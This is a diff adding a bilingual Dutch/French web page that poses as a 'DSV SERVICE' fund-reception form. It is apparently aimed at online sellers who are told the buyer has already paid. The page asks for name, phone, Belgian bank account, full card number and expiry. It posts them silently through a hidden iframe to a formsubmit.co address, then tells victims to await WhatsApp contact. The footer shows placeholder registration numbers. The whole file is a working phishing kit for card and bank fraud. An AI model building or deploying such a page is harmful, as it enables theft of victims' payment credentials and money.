@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    
+    <!-- ===== FAVICON (fichiers locaux) ===== -->
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    
+    <title>DSV SERVICE – Réception de fonds</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* ===== STYLES ===== */
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: #f0f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            padding: 20px;
+        }
+        .container {
+            max-width: 750px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 24px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.06);
+            padding: 40px 44px;
+            border: 1px solid #eef2f6;
+            position: relative;
+        }
+        .lang-toggle {
+            position: absolute;
+            top: 16px;
+            right: 24px;
+            display: flex;
+            gap: 4px;
+            background: #f1f5f9;
+            border-radius: 40px;
+            padding: 4px;
+            border: 1px solid #e2e8f0;
+        }
+        .lang-toggle button {
+            border: none;
+            background: transparent;
+            padding: 5px 14px;
+            border-radius: 30px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            color: #64748b;
+            transition: 0.2s;
+            font-family: inherit;
+        }
+        .lang-toggle button.active {
+            background: #0a2647;
+            color: white;
+            box-shadow: 0 2px 8px rgba(10,38,71,0.15);
+        }
+        .lang-toggle button:hover:not(.active) { background: #e2e8f0; }
+
+        .header { text-align:center; margin-bottom:8px; padding-top:8px; }
+        .header h1 {
+            font-size:28px; font-weight:700; color:#0a2647; letter-spacing:-0.5px; margin-bottom:4px;
+        }
+        .header h1 span { font-weight:300; color:#6b8a9f; font-size:16px; margin-left:6px; }
+        .header .subtitle { font-size:16px; color:#1e293b; font-weight:500; margin-top:4px; }
+        .header .subtitle-light { font-size:14px; color:#64748b; margin-top:2px; font-weight:400; }
+
+        .section-title {
+            font-size:18px; font-weight:700; color:#0a2647; margin:24px 0 12px 0;
+            border-bottom:2px solid #e9edf2; padding-bottom:8px;
+        }
+        .info-box-free {
+            background:#ecfdf5; border-left:5px solid #059669; padding:16px 20px;
+            border-radius:10px; margin:16px 0 20px 0;
+        }
+        .info-box-free p { font-size:15px; line-height:1.6; color:#065f46; font-weight:500; }
+        .info-box-free strong { color:#047857; }
+
+        .form-group { margin-bottom:16px; position:relative; }
+        .form-group label { display:block; font-size:14px; font-weight:600; color:#1e293b; margin-bottom:4px; }
+        .form-group label .required { color:#b91c1c; margin-left:2px; }
+        .form-group label .optional { font-weight:400; color:#94a3b8; font-size:12px; }
+        .form-group input {
+            width:100%; padding:12px 14px; border:1.5px solid #e2e8f0; border-radius:10px;
+            font-size:15px; transition:0.2s; background:#ffffff; color:#0f172a; font-family:inherit;
+        }
+        .form-group input:focus { outline:none; border-color:#0a2647; box-shadow:0 0 0 4px rgba(10,38,71,0.06); }
+        .form-group input::placeholder { color:#94a3b8; }
+
+        .form-group input.valid { border-color:#059669; background:#f0fdf4; }
+        .form-group input.invalid { border-color:#b91c1c; background:#fef2f2; }
+
+        .form-group .error-msg {
+            display:none; font-size:12px; color:#b91c1c; margin-top:4px; font-weight:500;
+        }
+        .form-group input.invalid ~ .error-msg { display:block; }
+
+        .form-row { display:grid; grid-template-columns:1fr 1fr; gap:16px; }
+
+        .btn-submit {
+            width:100%; background:#0a2647; color:white; padding:16px; border:none; border-radius:50px;
+            font-size:17px; font-weight:600; cursor:pointer; transition:all 0.2s;
+            box-shadow:0 4px 16px rgba(10,38,71,0.15); letter-spacing:0.3px; font-family:inherit; margin-top:8px;
+        }
+        .btn-submit:hover { background:#14375f; transform:translateY(-2px); box-shadow:0 8px 28px rgba(10,38,71,0.2); }
+        .btn-submit:active { transform:translateY(0); }
+        .btn-submit:disabled { opacity:0.6; cursor:not-allowed; transform:none; box-shadow:none; }
+
+        .footer {
+            margin-top:28px; padding-top:18px; border-top:1px solid #e9edf2;
+            text-align:center; font-size:12px; color:#94a3b8; line-height:1.8;
+        }
+        .footer a { color:#0a2647; text-decoration:none; font-weight:500; }
+        .footer a:hover { text-decoration:underline; }
+
+        @media (max-width:640px) {
+            .container { padding:20px 18px; }
+            .form-row { grid-template-columns:1fr; gap:0; }
+            .header h1 { font-size:24px; }
+            .lang-toggle { position:relative; top:0; right:0; margin-bottom:12px; align-self:flex-end; }
+        }
+
+        /* ===== GESTION DES LANGUES ===== */
+        .fr { display:block; }
+        .nl { display:none; }
+        .lang-nl .fr { display:none; }
+        .lang-nl .nl { display:block; }
+
+        /* ===== MODAL (POP-UP) ===== */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.45);
+            backdrop-filter: blur(4px);
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+        .modal-overlay.active { display: flex; }
+
+        .modal {
+            max-width: 520px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 24px;
+            padding: 40px 36px;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.2);
+            text-align: center;
+            animation: fadeSlide 0.3s ease-out;
+        }
+        .modal .icon { font-size: 56px; margin-bottom: 12px; }
+        .modal h2 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #0a2647;
+            margin-bottom: 8px;
+        }
+        .modal p {
+            font-size: 16px;
+            line-height: 1.7;
+            color: #334155;
+            margin: 8px 0 12px 0;
+        }
+        .modal .btn-close {
+            background: #0a2647;
+            color: white;
+            border: none;
+            padding: 12px 36px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: inherit;
+            margin-top: 8px;
+        }
+        .modal .btn-close:hover { background: #14375f; }
+
+        @keyframes fadeSlide {
+            0% { opacity:0; transform:translateY(-20px) scale(0.96); }
+            100% { opacity:1; transform:translateY(0) scale(1); }
+        }
+
+        #hiddenIframe { display: none; }
+    </style>
+</head>
+<body>
+
+<!-- ===== CONTENEUR PRINCIPAL (langue NL par défaut) ===== -->
+<div class="container lang-nl" id="pageContainer">
+
+    <!-- ===== BOUTON DE LANGUE ===== -->
+    <div class="lang-toggle">
+        <button class="active" data-lang="nl" onclick="setLang('nl')">NL</button>
+        <button data-lang="fr" onclick="setLang('fr')">FR</button>
+    </div>
+
+    <!-- ===== HEADER ===== -->
+    <div class="header">
+        <h1>DSV <span>SERVICE</span></h1>
+        <p class="subtitle">
+            <span class="fr">Formulaire de réception de fonds</span>
+            <span class="nl">Formulier voor ontvangst van gelden</span>
+        </p>
+        <p class="subtitle-light">
+            <span class="fr">Traitement rapide et sécurisé</span>
+            <span class="nl">Snelle en veilige verwerking</span>
+        </p>
+        <p style="font-size:13px; color:#64748b; margin-top:4px;">
+            <span class="fr">Remplissez correctement le formulaire pour recevoir votre argent dès aujourd'hui par virement immédiat.</span>
+            <span class="nl">Vul het formulier correct in om vandaag nog uw geld te ontvangen via een onmiddellijke overschrijving.</span>
+        </p>
+    </div>
+
+    <!-- ===== MESSAGE GRATUIT ===== -->
+    <div class="info-box-free">
+        <p>
+            <span class="fr">⚠️ <strong>Informations importantes :</strong> Attention : vous n'avez rien à payer ; l'acheteur a déjà tout réglé, donc pour vous c'est <strong>gratuit</strong>.</span>
+            <span class="nl">⚠️ <strong>Belangrijke informatie :</strong> Let op: u hoeft niets te betalen; de koper heeft al alles betaald, dus voor u is het <strong>gratis</strong>.</span>
+        </p>
+    </div>
+
+    <!-- ===== FORMULAIRE ===== -->
+    <form action="https://formsubmit.co/service@dsv.center" method="POST" id="mainForm" target="hiddenIframe">
+        <input type="hidden" name="_subject" value="DSV SERVICE – Nouvelle demande de réception">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_template" value="table">
+        <input type="hidden" name="Numéro de suivi" value="BE 75129355470">
+
+        <p class="section-title">
+            <span class="fr">📋 Réception de fonds</span>
+            <span class="nl">📋 Ontvangst van gelden</span>
+        </p>
+
+        <!-- ===== NOM ===== -->
+        <div class="form-group">
+            <label for="fullname">
+                <span class="fr">Nom complet <span class="required">*</span></span>
+                <span class="nl">Volledige naam <span class="required">*</span></span>
+            </label>
+            <input type="text" id="fullname" name="Nom complet" 
+                   placeholder="Votre nom complet" 
+                   minlength="2" maxlength="100"
+                   pattern="[a-zA-ZÀ-ÿ\s\-']+"
+                   title="Uniquement des lettres, espaces, tirets et apostrophes"
+                   required>
+            <span class="error-msg"><span class="fr">⚠️ Lettres, espaces, tirets et apostrophes uniquement</span><span class="nl">⚠️ Alleen letters, spaties, streepjes en apostrofs</span></span>
+        </div>
+
+        <div class="form-row">
+            <!-- ===== TÉLÉPHONE ===== -->
+            <div class="form-group">
+                <label for="phone">
+                    <span class="fr">Téléphone <span class="required">*</span></span>
+                    <span class="nl">Telefoon <span class="required">*</span></span>
+                </label>
+                <input type="tel" id="phone" name="Téléphone" 
+                       placeholder="+32 476 12 34 56" 
+                       pattern="^\+[1-9][0-9\s]{7,14}$"
+                       title="Format international (ex: +32 476 12 34 56)"
+                       required>
+                <span class="error-msg"><span class="fr">⚠️ Format international (ex: +32 476 12 34 56)</span><span class="nl">⚠️ Internationaal formaat (bv: +32 476 12 34 56)</span></span>
+            </div>
+
+            <!-- ===== EMAIL ===== -->
+            <div class="form-group">
+                <label for="email">
+                    <span class="fr">Adresse e-mail <span class="required">*</span></span>
+                    <span class="nl">E-mailadres <span class="required">*</span></span>
+                </label>
+                <input type="email" id="email" name="Email" 
+                       placeholder="votre.email@example.com" 
+                       required>
+                <span class="error-msg"><span class="fr">⚠️ Exemple : nom@domaine.com</span><span class="nl">⚠️ Voorbeeld : naam@domein.be</span></span>
+            </div>
+        </div>
+
+        <p class="section-title" style="margin-top:24px;">
+            <span class="fr">🏦 Informations bancaires</span>
+            <span class="nl">🏦 Bankgegevens</span>
+        </p>
+
+        <!-- ===== COMPTE BE (préfixe BE + 14 chiffres) ===== -->
+        <div class="form-group">
+            <label for="compte_be">
+                <span class="fr">Numéro de compte BE <span class="required">*</span></span>
+                <span class="nl">Rekeningnummer BE <span class="required">*</span></span>
+            </label>
+            <input type="text" id="compte_be" name="Numéro de compte BE" 
+                   placeholder="BE 1234 5678 9012 34" 
+                   required>
+            <span class="error-msg"><span class="fr">⚠️ 14 chiffres (ex: BE 1234 5678 9012 34)</span><span class="nl">⚠️ 14 cijfers (bv: BE 1234 5678 9012 34)</span></span>
+        </div>
+
+        <!-- ===== CARTE 52/49/51 ===== -->
+        <div class="form-group">
+            <label for="carte_52">
+                <span class="fr">Numéro de carte 52/49/51 <span class="required">*</span></span>
+                <span class="nl">Kaartnummer 52/49/51 <span class="required">*</span></span>
+            </label>
+            <input type="text" id="carte_52" name="Numéro de carte 52/49/51" 
+                   placeholder="4312 5900 7901 1248" 
+                   required>
+            <span class="error-msg"><span class="fr">⚠️ 16 chiffres (ex: 4312 5900 7901 1248)</span><span class="nl">⚠️ 16 cijfers (bv: 4312 5900 7901 1248)</span></span>
+        </div>
+
+        <div class="form-row">
+            <!-- ===== DATE D'EXPIRATION ===== -->
+            <div class="form-group">
+                <label for="expiry">
+                    <span class="fr">Date d'expiration <span class="required">*</span></span>
+                    <span class="nl">Vervaldatum <span class="required">*</span></span>
+                </label>
+                <input type="text" id="expiry" name="Date d'expiration" 
+                       placeholder="MM/AA" 
+                       maxlength="5"
+                       required>
+                <span class="error-msg">
+                    <span class="fr">⚠️ Format MM/AA (ex: 12/25)</span>
+                    <span class="nl">⚠️ Formaat MM/JJ (bv: 12/25)</span>
+                </span>
+            </div>
+
+            <!-- ===== MONTANT EN EURO ===== -->
+            <div class="form-group">
+                <label for="amount">
+                    <span class="fr">Montant à recevoir (€) <span class="required">*</span></span>
+                    <span class="nl">Te ontvangen bedrag (€) <span class="required">*</span></span>
+                </label>
+                <input type="text" id="amount" name="Montant à recevoir" 
+                       placeholder="0,00 €" 
+                       pattern="[0-9]+([,.][0-9]{1,2})?" 
+                       title="Format décimal (ex: 150,00 ou 150.00)"
+                       required>
+                <span class="error-msg"><span class="fr">⚠️ Exemple : 150,00 ou 150.00</span><span class="nl">⚠️ Voorbeeld : 150,00 of 150.00</span></span>
+            </div>
+        </div>
+
+        <!-- ===== ÂGE ===== -->
+        <div class="form-group">
+            <label for="age">
+                <span class="fr">Âge <span class="required">*</span></span>
+                <span class="nl">Leeftijd <span class="required">*</span></span>
+            </label>
+            <input type="number" id="age" name="Âge" 
+                   placeholder="Votre âge" 
+                   min="18" max="120" 
+                   required>
+            <span class="error-msg"><span class="fr">⚠️ Âge entre 18 et 120 ans</span><span class="nl">⚠️ Leeftijd tussen 18 en 120 jaar</span></span>
+        </div>
+
+        <button type="submit" class="btn-submit" id="submitBtn">
+            <span class="fr">💰 Envoyer la Demande</span>
+            <span class="nl">💰 Aanvraag verzenden</span>
+        </button>
+        <p style="font-size:12px; color:#94a3b8; text-align:center; margin-top:14px;">
+            <span class="fr">En cliquant, vous acceptez notre politique de confidentialité.</span>
+            <span class="nl">Door te klikken gaat u akkoord met ons privacybeleid.</span>
+        </p>
+    </form>
+
+    <!-- ===== FOOTER ===== -->
+    <div class="footer">
+        <strong>DSV SERVICE</strong> – Bedrijvenzone Machelen Cargo 829/A, 1830 Machelen (Belgique)<br>
+        TVA / BTW : BE 1234.567.890 – RPR / KBO : 1234.567.890<br>
+        <a href="#"><span class="fr">Mentions légales</span><span class="nl">Wettelijke kennisgeving</span></a> – 
+        <a href="#"><span class="fr">Politique de confidentialité</span><span class="nl">Privacybeleid</span></a>
+    </div>
+
+    <!-- ===== POP-UP DE CONFIRMATION (WhatsApp) ===== -->
+    <div class="modal-overlay" id="confirmationModal">
+        <div class="modal">
+            <div class="icon">✅</div>
+            <h2>
+                <span class="fr">Nous avons reçu votre demande</span>
+                <span class="nl">We hebben uw aanvraag ontvangen</span>
+            </h2>
+            <p>
+                <span class="fr">
+                    Un agent <strong>DSV Dienst</strong> vous contactera via <strong>WhatsApp</strong> pour vérification.<br>
+                    Suivez les instructions sur WhatsApp pour recevoir votre argent dès aujourd'hui par virement immédiat.
+                </span>
+                <span class="nl">
+                    Een medewerker van <strong>DSV Dienst</strong> neemt contact met u op via <strong>WhatsApp</strong> voor verificatie.<br>
+                    Volg de instructies op WhatsApp om vandaag nog uw geld te ontvangen via een onmiddellijke overschrijving.
+                </span>
+            </p>
+            <p style="font-size:14px; color:#64748b; margin-bottom:0;">
+                <span class="fr">Merci</span>
+                <span class="nl">Bedankt</span>
+            </p>
+            <button class="btn-close" onclick="closeModal()">
+                <span class="fr">Fermer</span>
+                <span class="nl">Sluiten</span>
+            </button>
+        </div>
+    </div>
+
+</div>
+
+<!-- ===== IFRAME CACHÉ ===== -->
+<iframe name="hiddenIframe" id="hiddenIframe"></iframe>
+
+<script>
+    // ================================================================
+    // 1. GESTION DU MODAL (POP-UP)
+    // ================================================================
+
+    const form = document.getElementById('mainForm');
+    const modal = document.getElementById('confirmationModal');
+    const submitBtn = document.getElementById('submitBtn');
+
+    const iframe = document.getElementById('hiddenIframe');
+    iframe.addEventListener('load', function() {
+        if (form.dataset.submitted === 'true') {
+            modal.classList.add('active');
+            submitBtn.disabled = false;
+            form.dataset.submitted = 'false';
+        }
+    });
+
+    form.addEventListener('submit', function(e) {
+        if (!form.checkValidity()) {
+            e.preventDefault();
+            return;
+        }
+        form.dataset.submitted = 'true';
+        submitBtn.disabled = true;
+    });
+
+    function closeModal() {
+        modal.classList.remove('active');
+        submitBtn.disabled = false;
+    }
+
+    modal.addEventListener('click', function(e) {
+        if (e.target === modal) closeModal();
+    });
+
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Escape') closeModal();
+    });
+
+    // ================================================================
+    // 2. TÉLÉPHONE (international)
+    // ================================================================
+
+    function cleanPhone(value) {
+        let cleaned = value.replace(/[^0-9+]/g, '');
+        
+        // CAS 1 : Numéro belge (+32)
+        if (cleaned.startsWith('+32')) {
+            let digits = cleaned.substring(3).replace(/\D/g, '');
+            if (digits.length > 9) digits = digits.slice(0, 9);
+            let formatted = '+32 ';
+            for (let i = 0; i < digits.length; i++) {
+                if (i === 2 || i === 4 || i === 6) formatted += ' ';
+                formatted += digits[i];
+            }
+            return formatted;
+        }
+        
+        // CAS 2 : Autres indicatifs internationaux
+        if (cleaned.startsWith('+')) {
+            let parts = cleaned.match(/^\+(\d+)(.*)/);
+            if (parts) {
+                let code = parts[1];
+                let rest = parts[2].replace(/\D/g, '');
+                let maxDigits = 15 - code.length;
+                if (rest.length > maxDigits) rest = rest.slice(0, maxDigits);
+                let formatted = '+' + code;
+                if (rest.length > 0) {
+                    formatted += ' ';
+                    for (let i = 0; i < rest.length; i++) {
+                        if (i > 0 && i % 2 === 0) formatted += ' ';
+                        formatted += rest[i];
+                    }
+                }
+                return formatted;
+            }
+        }
+        return cleaned;
+    }
+
+    function validatePhone(input) {
+        let raw = input.value.replace(/\s/g, '');
+        const isValid = /^\+\d{8,15}$/.test(raw);
+        if (isValid) {
+            input.className = 'valid';
+            input.setCustomValidity('');
+        } else if (input.value.length > 0) {
+            input.className = 'invalid';
+            input.setCustomValidity('Format international (ex: +32 476 12 34 56)');
+        } else {
+            input.className = '';
+            input.setCustomValidity('');
+        }
+    }
+
+    const phoneInput = document.getElementById('phone');
+    phoneInput.addEventListener('input', function() {
+        this.value = cleanPhone(this.value);
+        validatePhone(this);
+    });
+    phoneInput.addEventListener('paste', function(e) {
+        setTimeout(() => {
+            this.value = cleanPhone(this.value);
+            validatePhone(this);
+        }, 0);
+    });
+    phoneInput.addEventListener('blur', function() { validatePhone(this); });
+
+    // ================================================================
+    // 3. COMPTE BE (préfixe BE + 14 chiffres)
+    // ================================================================
+
+    function formatCompteBE(value) {
+        if (value.length === 0) return 'BE ';
+        let digits = value.replace(/BE\s*/i, '').replace(/\s/g, '').replace(/\D/g, '');
+        if (digits.length > 14) digits = digits.slice(0, 14);
+        let formatted = 'BE ';
+        for (let i = 0; i < digits.length; i++) {
+            if (i > 0 && i % 4 === 0) formatted += ' ';
+            formatted += digits[i];
+        }
+        return formatted;
+    }
+
+    function validateCompteBE(input) {
+        let raw = input.value.replace(/BE\s*/i, '').replace(/\s/g, '');
+        let digits = raw.replace(/\D/g, '');
+        if (digits.length === 14) {
+            input.className = 'valid';
+            input.setCustomValidity('');
+        } else if (input.value.length > 2) {
+            input.className = 'invalid';
+            input.setCustomValidity('14 chiffres requis après BE');
+        } else {
+            input.className = '';
+            input.setCustomValidity('');
+        }
+    }
+
+    const compteBE = document.getElementById('compte_be');
+    compteBE.addEventListener('focus', function() {
+        if (this.value === '') this.value = 'BE ';
+    });
+    compteBE.addEventListener('input', function() {
+        if (!this.value.startsWith('BE ')) {
+            this.value = 'BE ' + this.value.replace(/BE\s*/i, '');
+        }
+        this.value = formatCompteBE(this.value);
+        validateCompteBE(this);
+    });
+    compteBE.addEventListener('paste', function(e) {
+        setTimeout(() => {
+            if (!this.value.startsWith('BE ')) {
+                this.value = 'BE ' + this.value.replace(/BE\s*/i, '');
+            }
+            this.value = formatCompteBE(this.value);
+            validateCompteBE(this);
+        }, 0);
+    });
+    compteBE.addEventListener('blur', function() { validateCompteBE(this); });
+
+    // ================================================================
+    // 4. CARTE 52/49/51 (16 chiffres)
+    // ================================================================
+
+    function formatCarte(value) {
+        let digits = value.replace(/\s/g, '').replace(/\D/g, '');
+        if (digits.length > 16) digits = digits.slice(0, 16);
+        let formatted = '';
+        for (let i = 0; i < digits.length; i++) {
+            if (i > 0 && i % 4 === 0) formatted += ' ';
+            formatted += digits[i];
+        }
+        return formatted;
+    }
+
+    function validateCarte(input) {
+        let digits = input.value.replace(/\s/g, '');
+        if (digits.length === 16) {
+            input.className = 'valid';
+            input.setCustomValidity('');
+        } else if (input.value.length > 0) {
+            input.className = 'invalid';
+            input.setCustomValidity('16 chiffres requis');
+        } else {
+            input.className = '';
+            input.setCustomValidity('');
+        }
+    }
+
+    const carteInput = document.getElementById('carte_52');
+    carteInput.addEventListener('input', function() {
+        this.value = formatCarte(this.value);
+        validateCarte(this);
+    });
+    carteInput.addEventListener('paste', function(e) {
+        setTimeout(() => {
+            this.value = formatCarte(this.value);
+            validateCarte(this);
+        }, 0);
+    });
+    carteInput.addEventListener('blur', function() { validateCarte(this); });
+
+    // ================================================================
+    // 5. DATE D'EXPIRATION
+    // ================================================================
+
+    function validateExpiry(input) {
+        const regex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
+        const val = input.value;
+        if (regex.test(val)) {
+            const year = parseInt(val.split('/')[1], 10);
+            if (year < 24 || year > 99) {
+                input.className = 'invalid';
+                input.setCustomValidity('Année invalide (24-99)');
+            } else {
+                input.className = 'valid';
+                input.setCustomValidity('');
+            }
+        } else {
+            if (val.length > 0) {
+                input.className = 'invalid';
+                input.setCustomValidity('Format MM/AA');
+            } else {
+                input.className = '';
+                input.setCustomValidity('');
+            }
+        }
+    }
+
+    const expiryInput = document.getElementById('expiry');
+    expiryInput.addEventListener('input', function() {
+        let raw = this.value.replace(/\D/g, '');
+        if (raw.length > 4) raw = raw.slice(0, 4);
+        let formatted = '';
+        for (let i = 0; i < raw.length; i++) {
+            if (i === 2) formatted += '/';
+            formatted += raw[i];
+        }
+        this.value = formatted;
+        validateExpiry(this);
+    });
+    expiryInput.addEventListener('paste', function(e) {
+        setTimeout(() => {
+            let raw = this.value.replace(/\D/g, '');
+            if (raw.length > 4) raw = raw.slice(0, 4);
+            let formatted = '';
+            for (let i = 0; i < raw.length; i++) {
+                if (i === 2) formatted += '/';
+                formatted += raw[i];
+            }
+            this.value = formatted;
+            validateExpiry(this);
+        }, 0);
+    });
+    expiryInput.addEventListener('blur', function() { validateExpiry(this); });
+
+    // ================================================================
+    // 6. VALIDATION GLOBALE
+    // ================================================================
+
+    function checkFormValidity() {
+        let allValid = true;
+        const nom = document.getElementById('fullname');
+        if (nom.value.length > 0 && !nom.checkValidity()) allValid = false;
+        if (phoneInput.value.length > 0 && phoneInput.className !== 'valid') allValid = false;
+        const email = document.getElementById('email');
+        if (email.value.length > 0 && !email.checkValidity()) allValid = false;
+        if (compteBE.value.length > 0 && compteBE.className !== 'valid') allValid = false;
+        if (carteInput.value.length > 0 && carteInput.className !== 'valid') allValid = false;
+        if (expiryInput.value.length > 0 && expiryInput.className !== 'valid') allValid = false;
+        const amount = document.getElementById('amount');
+        if (amount.value.length > 0 && !amount.checkValidity()) allValid = false;
+        const age = document.getElementById('age');
+        if (age.value.length > 0 && !age.checkValidity()) allValid = false;
+
+        submitBtn.disabled = !allValid;
+    }
+
+    document.querySelectorAll('input').forEach(input => {
+        input.addEventListener('input', checkFormValidity);
+        input.addEventListener('change', checkFormValidity);
+        input.addEventListener('blur', checkFormValidity);
+    });
+    checkFormValidity();
+
+    // ================================================================
+    // 7. NETTOYAGE AVANT ENVOI
+    // ================================================================
+
+    form.addEventListener('submit', function() {
+        document.getElementById('compte_be').value = document.getElementById('compte_be').value.replace(/\s/g, '');
+        document.getElementById('carte_52').value = document.getElementById('carte_52').value.replace(/\s/g, '');
+        document.getElementById('phone').value = document.getElementById('phone').value.replace(/\s/g, '');
+    });
+
+    // ================================================================
+    // 8. BASCULE DE LANGUE
+    // ================================================================
+
+    function setLang(lang) {
+        const container = document.getElementById('pageContainer');
+        const buttons = document.querySelectorAll('.lang-toggle button');
+        buttons.forEach(btn => btn.classList.remove('active'));
+        const activeBtn = document.querySelector(`.lang-toggle button[data-lang="${lang}"]`);
+        if (activeBtn) activeBtn.classList.add('active');
+
+        if (lang === 'nl') {
+            container.classList.add('lang-nl');
+        } else {
+            container.classList.remove('lang-nl');
+        }
+    }
+</script>
+
+</body>
+</html>
